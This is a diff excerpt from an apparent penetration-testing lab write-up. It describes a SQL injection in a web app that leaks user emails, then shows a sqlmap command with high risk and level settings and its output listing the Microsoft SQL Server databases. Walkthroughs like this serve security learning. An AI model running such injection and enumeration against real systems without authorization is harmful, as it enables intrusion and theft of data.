@@ -148,4 +148,28 @@ It also shows the query it ran, so i may be able to take SQLi even further!
 
 Also doing a legitimate query like `villa` shows the agent email address, so its giving me valid users!
 
-So ill use SQLmap to find the available d
+So ill use SQLmap to find the available databases
+
+# SQLmap
+
+```python
+sqlmap -r request.txt --level=4 --risk=3 --dbs --flush-session --batch
+
+[17:44:41] [INFO] testing Microsoft SQL Server
+[17:44:42] [INFO] confirming Microsoft SQL Server
+[17:44:43] [INFO] the back-end DBMS is Microsoft SQL Server
+web server operating system: Windows 2022 or 2019 or 11 or 10 or 2016
+web application technology: ASP.NET 4.0.30319, Microsoft IIS 10.0, ASP.NET
+back-end DBMS: Microsoft SQL Server 2019
+[17:44:43] [INFO] fetching database names
+available databases [5]:
+[*] master
+[*] model
+[*] msdb
+[*] NorthStoneDB
+[*] tempdb
+```
+
+There are 4 default databases
+
+`NorthStoneDB` is what the web app is pulling from 
